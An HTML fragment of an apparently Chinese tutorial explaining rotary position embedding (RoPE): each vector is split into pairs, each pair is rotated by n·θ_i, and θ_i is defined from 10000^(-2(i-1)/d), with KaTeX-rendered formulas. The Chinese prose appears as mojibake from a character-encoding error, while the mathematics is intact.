<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">x_{n}^{[j]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1614em;vertical-align:-0.1166em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span></span>è¡¨ç¤ºç¬¬<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>è¡Œç¬¬<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span>åˆ—çš„æ•°</p>
</li>
</ul>
<p>å¯¹æ¯ä¸€è¡Œçš„å‘é‡åšå¦‚ä¸‹æ“ä½œï¼š</p>
<p>å°†ç¬¬<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>è¡Œå‘é‡åˆ’åˆ†ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">d/2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mord">/2</span></span></span></span></span>ä¸ªäºŒç»´å­å‘é‡ï¼Œå³<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>4</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>5</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>6</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>d</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>d</mi><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[x_{n}^{[1]},x_{n}^{[2]}],[x_{n}^{[3]},x_{n}^{[4]}],[x_{n}^{[5]},x_{n}^{[6]}]...[x_{n}^{[d-1]},x_{n}^{[d]}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2948em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">3</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">4</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">5</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">6</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mord">...</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">d</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">d</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span></span></span></span></span>ï¼Œç„¶åä¾æ¬¡è¿›è¡Œä¸‹é¢çš„è¿ç®—</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>Î¸</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>âˆ’</mo><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>Î¸</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>Î¸</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>Î¸</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}
x_{n}^{[i]}\\
x_{n}^{[i+1]}
\end{bmatrix} = \begin{bmatrix}
 cos(n\theta_{i} ) &amp; -sin(n\theta_{i} )
\\
 sin(n\theta_{i} ) &amp; cos(n\theta_{i} )
\end{bmatrix} \begin{bmatrix}
x_{n}^{[i]}
 \\
x_{n}^{[i+1]}
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6548em;"><span style="top:-3.6548em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.1548em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">]</span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">cos</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">Î¸</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">Î¸</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">âˆ’</span><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">Î¸</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">cos</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">Î¸</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6548em;"><span style="top:-3.6548em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.1548em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">]</span></span></span></span></span></span></span></div>
<p>ä¸Šå¼ä¸­çš„ç­‰å·åœ¨ç®—æ³•å®ç°ä¸­è¡¨ç¤º<strong>èµ‹å€¼æ›´æ–°</strong>æ“ä½œï¼Œå³ç”¨è®¡ç®—åçš„æ–°å€¼æ›¿æ¢åŸå‘é‡ä¸­çš„å¯¹åº”å…ƒç´ ã€‚ç»è¿‡å¯¹æ¯ä¸€ç»„äºŒç»´å­å‘é‡ä¾æ¬¡è¿›è¡Œä¸Šè¿°å˜æ¢åï¼Œæˆ‘ä»¬ä¾¿å¾—åˆ°äº† RoPE å˜æ¢åçš„æ–°çŸ©é˜µ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></mrow><annotation encoding="application/x-tex">X'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span></span></span>ã€‚</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>Î¸</mi><mi>i</mi></msub><mo>=</mo><mn>1000</mn><msup><mn>0</mn><mrow><mo>âˆ’</mo><mfrac><mrow><mn>2</mn><mo stretchy="false">(</mo><mi>i</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mi>d</mi></mfrac></mrow></msup><mtext>Â </mtext><mo separator="true">,</mo><mtext>Â </mtext><mi>i</mi><mo>âˆˆ</mo><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mfrac><mi>d</mi><mn>2</mn></mfrac><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\theta_{i} = 10000^{-\frac{2(i-1)}{d} } \space , \space i \in [1,2,...,\frac{d}{2} ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">Î¸</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.3339em;vertical-align:-0.1944em;"/><span class="mord">1000</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1395em;"><span style="top:-3.413em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0378em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"/><span class="frac-line mtight" style="border-bottom-width:0.049em;"/></span><span style="top:-3.5021em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span/></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"/></span></span></span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"/><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">d</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">]</span></span></span></span></span></div>
